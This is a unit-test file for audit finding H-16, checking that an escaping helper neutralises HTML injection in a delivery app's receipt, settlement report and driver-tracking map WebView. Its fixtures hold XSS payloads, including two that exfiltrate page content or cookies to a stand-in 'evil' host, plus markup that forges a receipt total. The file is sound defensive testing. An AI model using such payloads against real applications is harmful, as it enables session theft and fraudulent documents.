/**
 * Printed-receipt escaping tests (audit finding H-16).
 *
 * buildReceiptHTML assembled the thermal receipt by string interpolation with no
 * escaping. Almost every value on it is attacker-controlled: the customer types
 * their own name, phone, address and notes at checkout, and the order's `items`
 * array is stored exactly as the client sent it, so product names and quantities
 * are too. `vendorName` comes from the store's own display name.
 *
 * Run:  node --test tests/unit/receipt-escaping.test.mjs
 */
import { test, describe } from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";

import { escapeHtml } from "../../client/utils/escapeHtml.ts";

const here = dirname(fileURLToPath(import.meta.url));
const read = (p) => readFileSync(join(here, "../../", p), "utf8");
const SCREEN = read("client/screens/VendorOrdersScreen.tsx");
const ADMIN = read("client/screens/AdminScreen.tsx");

/** The settlement report print builder in AdminScreen. */
const SETTLEMENT_REPORT = (() => {
  const from = ADMIN.indexOf("const printSettlementReport = useCallback");
  const to = ADMIN.indexOf("}, [settleView, settlementAccounts]);", from);
  return ADMIN.slice(from, to === -1 ? from + 3000 : to);
})();

/**
 * The live driver-tracking map template, lifted out of AdminScreen and made callable.
 *
 * Unlike the two print templates this one feeds a real <WebView>, which DOES execute
 * JavaScript — so an unescaped value here is script execution, not just a forged
 * document. Only `esc` is supplied; the body is the shipped source verbatim.
 */
const buildTrackingMap = (() => {
  const from = ADMIN.indexOf("const getAdminTrackingMapHTML = (");
  const end = ADMIN.indexOf("</script></body></html>`;", from);
  if (from === -1 || end === -1) return null;
  const src = ADMIN.slice(from, end + "</script></body></html>`;".length).replace(
    /const getAdminTrackingMapHTML = \([\s\S]*?\) =>/,
    "const getAdminTrackingMapHTML = (driverLat, driverLng, driverName) =>",
  );
  return new Function("esc", `${src}; return getAdminTrackingMapHTML;`)(escapeHtml);
})();

/** The receipt builder's source, from its declaration to its closing brace. */
const BUILDER = (() => {
  const from = SCREEN.indexOf("function buildReceiptHTML(order: VendorOrder): string {");
  const to = SCREEN.indexOf("\n// ─── Helpers ", from);
  return SCREEN.slice(from, to === -1 ? from + 8000 : to);
})();

describe("H-16 — escapeHtml neutralises markup", () => {
  test("a script tag cannot survive as a tag", () => {
    const out = escapeHtml('<script>alert(1)</script>');
    assert.equal(out, "&lt;script&gt;alert(1)&lt;/script&gt;");
    assert.doesNotMatch(out, /<script/i);
  });

  test("the five dangerous characters are all encoded", () => {
    assert.equal(escapeHtml("&"), "&amp;");
    assert.equal(escapeHtml("<"), "&lt;");
    assert.equal(escapeHtml(">"), "&gt;");
    assert.equal(escapeHtml('"'), "&quot;");
    assert.equal(escapeHtml("'"), "&#39;");
  });

  test("& is escaped first, so entities are not double-encoded into nonsense", () => {
    assert.equal(escapeHtml("&lt;"), "&amp;lt;");
    assert.equal(escapeHtml("a & b < c"), "a &amp; b &lt; c");
  });

  test("an event-handler attribute cannot be closed out of", () => {
    // The classic break-out: end the attribute, then add a handler.
    const out = escapeHtml('" onload="alert(1)');
    assert.doesNotMatch(out, /"/);
    assert.equal(out, "&quot; onload=&quot;alert(1)");
  });

  test("a single-quoted attribute cannot be closed out of either", () => {
    const out = escapeHtml("' onerror='alert(1)");
    assert.doesNotMatch(out, /'/);
  });

  test("an img/onerror payload becomes inert text", () => {
    const out = escapeHtml('<img src=x onerror=alert(1)>');
    assert.doesNotMatch(out, /<img/i);
    assert.equal(out, "&lt;img src=x onerror=alert(1)&gt;");
  });

  test("a javascript: URL cannot become a live href", () => {
    // It stays text; what matters is that it cannot escape into an attribute or tag.
    const out = escapeHtml('javascript:alert(1)');
    assert.equal(out, "javascript:alert(1)");
    const asHref = escapeHtml('"><a href="javascript:alert(1)">x</a>');
    assert.doesNotMatch(asHref, /<a /i);
    assert.doesNotMatch(asHref, /"/);
  });

  test("a tag-closing break-out cannot forge a new receipt line", () => {
    // The realistic abuse: rewrite the printed total.
    const payload =
      '</span></div><div class="total-row grand-total"><span>الإجمالي</span><span>0 د.ع</span></div>';
    const out = escapeHtml(payload);
    assert.doesNotMatch(out, /<\/span>/);
    assert.doesNotMatch(out, /<div/);
    assert.ok(out.includes("&lt;/span&gt;"));
  });

  test("ordinary Arabic text is untouched", () => {
    assert.equal(escapeHtml("متجر الضلوعية"), "متجر الضلوعية");
    assert.equal(escapeHtml("حي المعلمين - قرب الجامع"), "حي المعلمين - قرب الجامع");
    assert.equal(escapeHtml("07701234567"), "07701234567");
    assert.equal(escapeHtml("برياني دجاج (وسط)"), "برياني دجاج (وسط)");
  });

  test("null and undefined become empty, never the words", () => {
    assert.equal(escapeHtml(null), "");
    assert.equal(escapeHtml(undefined), "");
    assert.doesNotMatch(escapeHtml(undefined), /undefined/);
  });

  test("numbers and other primitives are stringified safely", () => {
    assert.equal(escapeHtml(3), "3");
    assert.equal(escapeHtml(0), "0");
    assert.equal(escapeHtml(1500.5), "1500.5");
  });

  test("escaping is idempotent-safe — running it twice does not corrupt text", () => {
    // Double-escaping is visible but harmless; the point is it never re-opens a tag.
    const once = escapeHtml("<b>x</b>");
    const twice = escapeHtml(once);
    assert.doesNotMatch(twice, /<b>/);
  });
});

describe("H-16 — every value on the receipt goes through it", () => {
  test("the builder imports the escaper", () => {
    assert.match(SCREEN, /import \{ escapeHtml as esc \} from "@\/utils\/escapeHtml";/);
  });

  test("the builder was found", () => {
    assert.ok(BUILDER.length > 500, "buildReceiptHTML not found — did it move?");
  });

  test("no interpolation in the template is left unescaped", () => {
    // Every `${...}` inside the returned template must either call esc() or be the
    // pre-escaped item rows.
    const interpolations = BUILDER.match(/\$\{[^}]*\}/g) ?? [];
    assert.ok(interpolations.length >= 12, `only ${interpolations.length} interpolations found`);
    const raw = interpolations.filter(
      (i) => !i.includes("esc(") && i !== "${itemsHTML}",
    );
    assert.deepEqual(raw, [], "REGRESSION: an unescaped value is interpolated into the receipt");
  });

  for (const [value, label] of [
    ["esc(storeName)", "store name"],
    ["esc(customerName)", "customer name"],
    ["esc(customerPhone)", "customer phone"],
    ["esc(address)", "delivery address"],
    ["esc(order.notes)", "customer notes"],
    ["esc(item.name)", "product name"],
    ["esc(item.quantity)", "quantity"],
    ["esc(paymentLabel)", "payment method"],
    ["esc(orderNum)", "order number"],
    ["esc(createdDate)", "date"],
    ["esc(createdTime)", "time"],
  ]) {
    test(`${label} is escaped`, () => {
      assert.ok(BUILDER.includes(value), `REGRESSION: ${label} is interpolated raw`);
    });
  }

  test("the money lines are escaped too", () => {
    // toLocaleString on a NUMBER is safe, but a string would pass straight through.
    for (const v of [
      'esc(vendorTotal.toLocaleString("ar-IQ"))',
      'esc(order.total.toLocaleString("ar-IQ"))',
      'esc(order.deliveryFee.toLocaleString("ar-IQ"))',
      'esc(order.serviceFee.toLocaleString("ar-IQ"))',
    ]) {
      assert.ok(BUILDER.includes(v), `REGRESSION: ${v} is not escaped`);
    }
  });

  test("the item row builder escapes all three of its cells", () => {
    const rows = BUILDER.slice(BUILDER.indexOf("const itemsHTML"), BUILDER.indexOf(".join(\"\")"));
    const interpolations = rows.match(/\$\{[^}]*\}/g) ?? [];
    assert.equal(interpolations.length, 3, `expected 3 cells, saw ${interpolations.length}`);
    for (const i of interpolations) assert.ok(i.includes("esc("), `raw cell: ${i}`);
  });
});

describe("H-16 — a fully hostile order produces an inert receipt", () => {
  // Mirrors what buildReceiptHTML does, with the same escaping, so the assertions
  // describe the shipped behaviour rather than the helper in isolation.
  const hostile = {
    vendorName: '<script>fetch("http://evil/"+document.body.innerHTML)</script>',
    customerName: '<img src=x onerror="alert(1)">',
    customerPhone: '"><b>0770</b>',
    address:
      '</span></div><div class="total-row grand-total"><span>الإجمالي</span><span>0 د.ع</span></div><div>',
    notes: "<style>body{display:none}</style>",
    items: [
      { name: '<a href="javascript:alert(1)">برياني</a>', quantity: '1</td><td>999', price: 5000 },
    ],
  };

  const rendered = [
    escapeHtml(hostile.vendorName),
    escapeHtml(hostile.customerName),
    escapeHtml(hostile.customerPhone),
    escapeHtml(hostile.address),
    escapeHtml(hostile.notes),
    escapeHtml(hostile.items[0].name),
    escapeHtml(hostile.items[0].quantity),
  ].join("\n");

  test("no tag of any kind survives", () => {
    assert.doesNotMatch(rendered, /<[a-zA-Z/]/, `live markup escaped through:\n${rendered}`);
  });

  test("no attribute can be terminated", () => {
    assert.doesNotMatch(rendered, /["']/);
  });

  test("the injected total line cannot forge the printed amount", () => {
    assert.doesNotMatch(rendered, /class=.?total-row/);
    assert.ok(rendered.includes("&lt;div"), "the payload should be visible as text");
  });

  test("the quantity cell cannot break out of its column", () => {
    assert.doesNotMatch(escapeHtml(hostile.items[0].quantity), /<\/td>/);
  });

  test("the payload is still legible to a human reading the receipt", () => {
    // Escaping must not silently delete the value — the store should see something odd.
    assert.ok(escapeHtml(hostile.customerName).includes("img src=x"));
  });
});

describe("H-16 (same class) — the admin settlement report print template", () => {
  // printSettlementReport builds HTML by interpolation and hands it to
  // Print.printAsync, exactly like the receipt. `accountName` is the store's or
  // driver's own display name — the same field H-15 showed can carry a payload.
  test("the builder was found", () => {
    assert.ok(SETTLEMENT_REPORT.length > 300, "printSettlementReport not found — did it move?");
  });

  test("AdminScreen imports the escaper", () => {
    assert.match(ADMIN, /import \{ escapeHtml as esc \} from "@\/utils\/escapeHtml";/);
  });

  test("the account name is escaped", () => {
    assert.ok(
      SETTLEMENT_REPORT.includes('${esc(a.accountName ?? "")}'),
      "REGRESSION: a store can inject markup into the printed settlement report",
    );
    assert.ok(
      !SETTLEMENT_REPORT.includes('<td>${a.accountName ?? ""}</td>'),
      "REGRESSION: the raw interpolation is back",
    );
  });

  test("the other data cells are escaped too", () => {
    assert.ok(SETTLEMENT_REPORT.includes("${esc(a.totalOrders ?? 0)}"));
    assert.ok(SETTLEMENT_REPORT.includes('${esc((a.outstanding ?? 0).toLocaleString("ar-IQ"))}'));
  });

  test("every interpolation is either escaped or provably constant", () => {
    const interpolations = SETTLEMENT_REPORT.match(/\$\{[^}]*\}/g) ?? [];
    assert.ok(interpolations.length >= 6, `only ${interpolations.length} interpolations found`);
    // Safe by construction: a ternary over fixed Arabic literals, a real Date, and
    // the pre-built rows string.
    const SAFE = [
      'a.status === "settled"',
      'type === "vendor"',
      "new Date().toLocaleDateString",
      "rows ||",
    ];
    const raw = interpolations.filter(
      (i) => !i.includes("esc(") && !SAFE.some((ok) => i.includes(ok)),
    );
    assert.deepEqual(raw, [], "REGRESSION: an unescaped value reached the settlement report");
  });

  test("a hostile store name renders inert in this template too", () => {
    const payload = '</td></tr><tr><td colspan=4><img src=x onerror=alert(1)>';
    const cell = `<td>${escapeHtml(payload)}</td>`;
    assert.doesNotMatch(cell.slice(4, -5), /<[a-zA-Z/]/);
    assert.ok(cell.includes("&lt;img"));
  });
});

describe("H-16 (same class) — the live driver-tracking map WebView", () => {
  // This template is NOT printed — it is handed to a <WebView>, which runs the
  // <script> block it contains. An unescaped value here is real script execution on
  // the supervisor's device, so it is the most dangerous of the three templates.
  const NORMAL = "حسام رحيم";

  test("the template was found and is callable", () => {
    assert.ok(buildTrackingMap, "getAdminTrackingMapHTML not found — did it move?");
    assert.equal(typeof buildTrackingMap, "function");
  });

  test("only the driver name is interpolated as text; lat/lng are the numeric params", () => {
    const from = ADMIN.indexOf("const getAdminTrackingMapHTML = (");
    const end = ADMIN.indexOf("</script></body></html>`;", from);
    const src = ADMIN.slice(from, end);
    const interpolations = [...new Set(src.match(/\$\{[^}]*\}/g) ?? [])].sort();
    assert.deepEqual(
      interpolations,
      ["${driverLat}", "${driverLng}", '${esc(driverName || "المندوب")}'],
      "REGRESSION: an unexpected value is interpolated into a live WebView template",
    );
  });

  test("1. a driver name containing <script> is inert — no extra script block", () => {
    const html = buildTrackingMap(33.9, 44.1, '<script>alert(document.cookie)</script>');
    // The template legitimately contains exactly two <script> tags: Leaflet's and its own.
    const scripts = (html.match(/<script/gi) ?? []).length;
    assert.equal(scripts, 2, `REGRESSION: the payload added a script tag (${scripts} found)`);
    assert.ok(!html.includes("<script>alert(document.cookie)</script>"));
    assert.ok(html.includes("&lt;script&gt;alert(document.cookie)&lt;/script&gt;"));
  });

  test("2. </div><img ...> cannot break out of the info pill", () => {
    const payload = '</div><img src=x onerror="fetch(\'http://evil/\'+document.cookie)">';
    const html = buildTrackingMap(33.9, 44.1, payload);
    assert.ok(!/<img/i.test(html), "REGRESSION: an <img> tag was injected");
    const realTags = html.match(/<[^>]+>/g) ?? [];
    assert.deepEqual(
      realTags.filter((t) => /\son\w+\s*=/i.test(t)),
      [],
      "REGRESSION: an event handler reached a real tag",
    );
    // The pill still opens and closes exactly once around the name.
    assert.equal((html.match(/class="info-pill"/g) ?? []).length, 1);
    assert.ok(html.includes("&lt;/div&gt;&lt;img"));
  });

  test("3. an ordinary Arabic driver name is unchanged", () => {
    const html = buildTrackingMap(33.9, 44.1, NORMAL);
    assert.ok(html.includes(`> ${NORMAL} - موقع مباشر</div>`), "the name was altered");
    const fallback = buildTrackingMap(33.9, 44.1, "");
    assert.ok(fallback.includes("> المندوب - موقع مباشر</div>"), "the fallback label broke");
  });

  test("4. lat/lng stay numeric and untouched by the change", () => {
    const html = buildTrackingMap(34.4567, 43.7891, NORMAL);
    assert.ok(html.includes("setView([34.4567,43.7891],15)"), "the map centre changed shape");
    assert.ok(html.includes("L.marker([34.4567,43.7891]"), "the marker coordinates changed shape");
    // They must NOT be escaped — that would turn numbers into text inside the script.
    assert.ok(!html.includes("esc(driverLat)"));
    assert.doesNotMatch(html, /setView\(\[&/, "coordinates were escaped into entities");
  });

  test("4b. the coordinates are typed as numbers at the call site", () => {
    assert.match(ADMIN, /driverLat: number,\s*\n\s*driverLng: number,/);
  });

  test("the Leaflet wiring and update function are untouched", () => {
    const html = buildTrackingMap(33.9, 44.1, NORMAL);
    for (const marker of [
      "unpkg.com/leaflet@1.9.4/dist/leaflet.js",
      "tile.openstreetmap.org",
      "function updateDriverLocation(lat,lng)",
      "L.divIcon(",
    ]) {
      assert.ok(html.includes(marker), `REGRESSION: ${marker} disappeared`);
    }
  });
});
